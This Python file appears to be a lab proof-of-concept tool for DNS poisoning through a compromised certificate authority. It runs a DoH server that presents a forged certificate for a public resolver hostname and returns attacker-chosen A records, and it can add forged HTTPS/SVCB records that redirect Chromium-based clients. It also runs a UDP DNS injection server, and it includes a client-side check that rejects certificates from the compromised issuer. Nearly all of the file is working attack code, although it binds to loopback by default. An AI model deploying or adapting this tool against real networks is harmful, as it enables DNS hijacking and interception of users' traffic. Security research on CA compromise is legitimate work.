#!/usr/bin/env python3
"""doh_mitm.py - DNS trigger arms for the integrated chain. Lab only.

Trigger mode (b): DoH MITM.  A CA compromise that lets an attacker issue a
certificate for the client's DoH resolver hostname (one.one.one.one /
dns.google) turns encrypted DNS into the poisoning vector: an on-path attacker
terminates the client's DoH session with the forged certificate and answers
victim-name queries with attacker-chosen A records.  No provider bug, no
resolver bug, no cache poisoning - the CA compromise itself is the trigger.

Trigger mode (c): plain-UDP DNS response injection baseline - the same answers
delivered as ordinary UDP DNS responses, the pre-DoH on-path case.

This module is a loopback lab instrument:

  * start_doh(...)   HTTPS DoH server (RFC 8484 /dns-query wire format and the
                     JSON /resolve form) presenting a supplied certificate.
  * start_udp(...)   UDP DNS responder returning the same answers.
  * doh_query(...)   client-side DoH resolution over a caller-supplied trust
                     context; optionally applies the hardened check that
                     rejects a chain issued by a known-compromised issuer
                     (the same check chain_demo applies to the app TLS).
  * udp_query(...)   client-side plain UDP resolution.

The certificates are supplied by the caller: either issued through
emudhra-dns-mitm-poc/certs/issue_leaf.py from the recovered eMudhra CA (the
real scenario) or synthetic stand-ins shaped like it.  No key material is read
from or written to secrets/ by this module.  There is no exploit payload here
and no malformed stream anywhere in the chain: the poisoned update bodies are
valid Brotli lab markers.
"""
import argparse
import base64
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import socket
import ssl
import sys
import threading
from pathlib import Path
from urllib.parse import urlparse, parse_qs

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(ROOT / "poc/vendor"))

from dnslib import DNSRecord, QTYPE, RCODE, RR, A  # noqa: E402
from dnslib.dns import HTTPS  # noqa: E402  - RFC 9460 record (type 65)
from dnslib.server import BaseResolver, DNSServer, DNSLogger  # noqa: E402

DOH_HOST_DEFAULT = "one.one.one.one"
ANSWER_TTL = 60


class AnswerMap:
    """Attacker-chosen answers: per-name or default (lab: any name).

    https_records adds trigger (e): a forged HTTPS/SVCB record (RFC 9460) that
    keeps the A record CORRECT but points the client at the attacker through
    its target/ipv4hint. Chromium (and therefore Electron) honors HTTPS RRs,
    which is what makes the DNS answer alone redirect the connection.
    {name: {"priority": 1, "target": ".", "ipv4hint": [ip, ...], "alpn": [..]}}
    """

    def __init__(self, answers=None, default_ip=None, https_records=None):
        self.answers = {name.rstrip(".").lower(): list(ips) for name, ips in (answers or {}).items()}
        self.default_ip = default_ip or (next(iter(self.answers.values()))[0] if self.answers else None)
        self.https_records = {name.rstrip(".").lower(): spec
                              for name, spec in (https_records or {}).items()}

    def addresses(self, qname):
        name = qname.rstrip(".").lower()
        return list(self.answers.get(name) or ([self.default_ip] if self.default_ip else []))

    def https_record(self, qname):
        name = qname.rstrip(".").lower()
        spec = self.https_records.get(name)
        if not spec:
            return None
        fields = [str(spec.get("priority", 1)), spec.get("target", ".")]
        hints = spec.get("ipv4hint") or []
        if hints:
            fields.append("ipv4hint=" + ",".join(hints))
        for alpn in spec.get("alpn") or ():
            fields.append("alpn=" + alpn)
        return HTTPS.fromZone(fields)


def build_reply(query, answer_map):
    qname = str(query.q.qname)
    reply = query.reply()
    addresses = answer_map.addresses(qname)
    https = answer_map.https_record(qname)
    if query.q.qtype == 65:  # HTTPS/SVCB query
        if https is not None:
            reply.add_answer(RR(query.q.qname, 65, rdata=https, ttl=ANSWER_TTL))
        return reply
    if query.q.qtype not in (QTYPE.A, QTYPE.ANY) or not addresses:
        reply.header.rcode = RCODE.NXDOMAIN if not addresses else RCODE.NOERROR
        return reply
    for address in addresses:
        reply.add_answer(RR(query.q.qname, QTYPE.A, rdata=A(address), ttl=ANSWER_TTL))
    if https is not None:
        # Trigger (e): the A answer stays CORRECT; the forged HTTPS record is
        # what redirects a client that honors RFC 9460.
        reply.add_answer(RR(query.q.qname, 65, rdata=https, ttl=ANSWER_TTL))
    return reply


class InjectResolver(BaseResolver):
    """The UDP injection baseline: answers directly, like a forged response."""

    def __init__(self, answer_map):
        self.answer_map = answer_map
        self.seen = []

    def resolve(self, request, handler):
        self.seen.append({"qname": str(request.q.qname), "qtype": QTYPE[request.q.qtype],
                          "via": "udp-injection"})
        return build_reply(request, self.answer_map)


class DoHHandler(BaseHTTPRequestHandler):
    server_version = "doh-mitm/1"
    protocol_version = "HTTP/1.1"

    def _reply(self, code, body, ctype):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def _answer_wire(self, wire):
        query = DNSRecord.parse(wire)
        answer_map = self.server.answer_map
        self.server.seen.append({"qname": str(query.q.qname),
                                 "qtype": QTYPE[query.q.qtype], "via": "doh-mitm"})
        reply = build_reply(query, answer_map)
        return reply.pack()

    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)
        if parsed.path == "/healthz":
            self._reply(200, b'{"ok":true}', "application/json")
            return
        if parsed.path == "/dns-query" and query.get("dns"):
            wire = base64.urlsafe_b64decode(query["dns"][0] + "=" * (-len(query["dns"][0]) % 4))
            self._reply(200, self._answer_wire(wire), "application/dns-message")
            return
        if parsed.path == "/resolve" and query.get("name"):
            name = query["name"][0]
            addresses = self.server.answer_map.addresses(name)
            self.server.seen.append({"qname": name, "qtype": query.get("type", ["A"])[0],
                                     "via": "doh-mitm-json"})
            answer = [{"name": name, "type": 1, "TTL": ANSWER_TTL, "data": address}
                      for address in addresses]
            self._reply(200, json.dumps({"Status": 0, "Answer": answer}).encode(),
                        "application/dns-json")
            return
        self._reply(404, b'{"error":"not found"}', "application/json")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0") or "0")
        body = self.rfile.read(length) if length else b""
        if urlparse(self.path).path == "/dns-query" and body:
            self._reply(200, self._answer_wire(body), "application/dns-message")
            return
        self._reply(404, b'{"error":"not found"}', "application/json")

    def log_message(self, fmt, *args):
        pass


def start_doh(cert, key, answer_map, bind="127.0.0.1", port=0):
    """Start the DoH MITM proxy; returns (server, thread, port)."""
    httpd = ThreadingHTTPServer((bind, port), DoHHandler)
    httpd.answer_map = answer_map
    httpd.seen = []
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(certfile=cert, keyfile=key)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return httpd, thread, httpd.server_address[1]


def start_udp(answer_map, bind="127.0.0.1", port=0):
    """Start the plain-UDP injection baseline; returns (resolver, servers, port)."""
    resolver = InjectResolver(answer_map)
    logger = DNSLogger(log="-request,-reply,-truncated,-error")
    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    probe.bind((bind, port))
    port = probe.getsockname()[1]
    probe.close()
    servers = [DNSServer(resolver, address=bind, port=port, tcp=tcp, logger=logger)
               for tcp in (False, True)]
    for server in servers:
        server.start_thread()
    return resolver, servers, port


def stop_udp(servers):
    for server in servers:
        try:
            server.stop()
            server.server.server_close()
        except Exception:
            pass


def doh_query(host, port, name, context, server_hostname=DOH_HOST_DEFAULT, qtype="A",
              peer_checker=None):
    """Resolve one name over DoH through the proxy.

    peer_checker, when given, inspects the proxy's certificate right after the
    handshake and its {"tls": "forged"} verdict is how the hardened client
    refuses a forged-CA DoH certificate (cert rejection is a TLS check, applied
    before any answer is believed).

    Returns {"decision": "RESOLVED", "answers": [...], ...} or
    {"decision": "TLS_REJECTED", ...} when the caller's trust context (or the
    hardened issuer-distrust check) refuses the proxy's certificate.
    """
    import http.client
    record = {"stage": "dns", "trigger": "doh-mitm", "doh_host": server_hostname, "qname": name}
    try:
        tls_socket = context.wrap_socket(socket.create_connection((host, port), timeout=8),
                                         server_hostname=server_hostname)
        if peer_checker is not None:
            verdict = peer_checker(tls_socket)
            record["doh_cert"] = verdict
            if verdict.get("tls") == "forged":
                tls_socket.close()
                record.update({"decision": "TLS_REJECTED",
                               "reason": "DoH endpoint certificate issued by a known-compromised "
                                         "issuer (hardened client refuses it before believing "
                                         "any answer)"})
                return record
        connection = http.client.HTTPSConnection(host, port, context=context, timeout=8)
        connection.sock = tls_socket
        query = DNSRecord.question(name, qtype)
        path = "/dns-query?dns=" + base64.urlsafe_b64encode(query.pack()).decode().rstrip("=")
        connection.request("GET", path, headers={"Host": server_hostname, "Accept": "application/dns-message"})
        response = connection.getresponse()
        body = response.read()
        connection.close()
    except ssl.SSLError as exc:
        record.update({"decision": "TLS_REJECTED",
                       "reason": "DoH endpoint certificate refused: " +
                                 (getattr(exc, "verify_message", None) or str(exc))})
        return record
    except OSError as exc:
        record.update({"decision": "INCONCLUSIVE", "reason": str(exc)})
        return record
    parsed = DNSRecord.parse(body)
    answers = [{"name": str(rr.rname), "type": QTYPE[rr.rtype], "address": str(rr.rdata),
                "ttl": rr.ttl}
               for rr in parsed.rr if rr.rtype == QTYPE.A]
    record.update({"decision": "RESOLVED" if answers else "INCONCLUSIVE",
                   "answers": answers,
                   "rcode": RCODE.get(parsed.header.rcode)})
    return record


def udp_query(host, port, name):
    """Resolve one name over plain UDP (the injection baseline)."""
    query = DNSRecord.question(name)
    raw = query.send(host, port, tcp=False, timeout=5)
    parsed = DNSRecord.parse(raw)
    answers = [{"name": str(rr.rname), "type": QTYPE[rr.rtype], "address": str(rr.rdata),
                "ttl": rr.ttl}
               for rr in parsed.rr if rr.rtype == QTYPE.A]
    return {"stage": "dns", "trigger": "udp-injection", "qname": name,
            "decision": "RESOLVED" if answers else "INCONCLUSIVE",
            "answers": answers, "rcode": RCODE.get(parsed.header.rcode)}


def https_hint(https_rd):
    """(target, ipv4hint list) out of an RFC 9460 HTTPS rdata."""
    hints = []
    for key, value in (https_rd.params or []):
        if key == 4:  # ipv4hint: concatenated 4-byte addresses
            for offset in range(0, len(value), 4):
                hints.append(socket.inet_ntoa(bytes(value[offset:offset + 4])))
    target = ".".join(seg.decode("ascii") for seg in (https_rd.target or [])) or "."
    return target, hints


def svcb_query(host, port, name):
    """Trigger (e): resolve one name the way a Chromium-class client does.

    Chromium honors HTTPS/SVCB records (RFC 9460): when the answer carries one,
    the connection follows its target/ipv4hint INSTEAD of the A record. The
    causal claim is deliberately narrow - the A record is correct in the forged
    answer; the DNS answer alone is what redirects the connection.
    """
    query = DNSRecord.question(name)
    raw = query.send(host, port, tcp=False, timeout=5)
    parsed = DNSRecord.parse(raw)
    a_addresses = [str(rr.rdata) for rr in parsed.rr if rr.rtype == QTYPE.A]
    record = {"stage": "dns", "trigger": "svcb", "qname": name,
              "a_address": a_addresses[0] if a_addresses else None,
              "rcode": RCODE.get(parsed.header.rcode)}
    for rr in parsed.rr:
        if rr.rtype == 65:  # HTTPS
            target, hints = https_hint(rr.rdata)
            redirect = hints[0] if hints else None
            record.update({"decision": "RESOLVED" if (redirect or a_addresses) else "INCONCLUSIVE",
                           "redirected": bool(redirect),
                           "redirect_via": "HTTPS RR (RFC 9460) ipv4hint" if redirect else None,
                           "address": redirect or record["a_address"],
                           "https": {"target": target, "ipv4hint": hints}})
            return record
    record.update({"decision": "RESOLVED" if a_addresses else "INCONCLUSIVE",
                   "redirected": False, "address": record["a_address"]})
    return record


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--mode", choices=["doh", "udp"], default="doh")
    ap.add_argument("--bind", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--cert", help="DoH endpoint certificate (forged, for the resolver hostname)")
    ap.add_argument("--key", help="matching private key")
    ap.add_argument("--answer", action="append", default=[],
                    help="NAME=IP attacker answer (repeatable)")
    ap.add_argument("--default-ip", help="answer for every other A query (lab: any name)")
    args = ap.parse_args()

    answers = {}
    for entry in args.answer:
        name, _, address = entry.partition("=")
        answers.setdefault(name.strip(), []).append(address.strip())
    answer_map = AnswerMap(answers, args.default_ip)
    if not answer_map.default_ip:
        ap.error("give --answer NAME=IP or --default-ip")
    if args.mode == "doh":
        if not (args.cert and args.key):
            ap.error("--cert and --key are required for --mode doh")
        _, _, port = start_doh(args.cert, args.key, answer_map, args.bind, args.port)
        print("doh-mitm listening on https://%s:%d/dns-query" % (args.bind, port), flush=True)
        threading.Event().wait()
    else:
        _, servers, port = start_udp(answer_map, args.bind, args.port)
        print("udp injection baseline listening on %s:%d" % (args.bind, port), flush=True)
        try:
            threading.Event().wait()
        except KeyboardInterrupt:
            stop_udp(servers)


if __name__ == "__main__":
    main()
